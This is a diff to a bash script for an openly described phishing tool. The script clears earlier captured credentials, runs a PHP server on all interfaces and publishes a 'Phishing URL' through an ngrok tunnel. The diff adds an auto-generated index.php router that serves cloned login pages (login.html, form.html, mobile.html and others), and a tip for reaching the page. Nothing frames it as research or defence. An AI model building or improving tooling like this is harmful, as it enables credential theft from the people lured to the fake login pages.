@@ -126,7 +126,38 @@ start_php_server() {
         echo -e "${YELLOW}[!] Cleared previous credentials${NC}"
     fi
     
-    # Start PHP server
+    # Create index router if it doesn't exist
+    if [ ! -f "index.php" ]; then
+        echo -e "${YELLOW}[*] Creating index router...${NC}"
+        cat > index.php << 'ROUTER_EOF'
+<?php
+// Auto-generated router for phishing tool
+// Serves the appropriate login page
+
+// Determine which file to serve
+if (file_exists('login.html')) {
+    include 'login.html';
+} elseif (file_exists('index.html')) {
+    include 'index.html';
+} elseif (file_exists('form.html')) {
+    include 'form.html';
+} elseif (file_exists('mobile.html')) {
+    include 'mobile.html';
+} else {
+    // List all HTML files and serve the first one
+    $html_files = glob('*.html');
+    if (!empty($html_files)) {
+        include $html_files[0];
+    } else {
+        echo '<h1>Phishing page not found</h1>';
+        echo '<p>No HTML files found in this directory.</p>';
+    }
+}
+?>
+ROUTER_EOF
+    fi
+    
+    # Start PHP server with router
     php -S 0.0.0.0:$PHP_PORT > /dev/null 2>&1 &
     PHP_PID=$!
     
@@ -169,6 +200,9 @@ start_ngrok_tunnel() {
             echo -e "${CYAN}║${NC}  ${BOLD}${GREEN}Phishing URL:${NC}                                          ${CYAN}║${NC}"
             echo -e "${CYAN}║${NC}  ${YELLOW}$NGROK_URL${NC}"
             echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
+            echo ""
+            echo -e "${BLUE}[*] TIP: If you get redirect errors, make sure to access:${NC}"
+            echo -e "${BLUE}    $NGROK_URL (main page will load automatically)${NC}"
             echo ""
             return 0
         fi
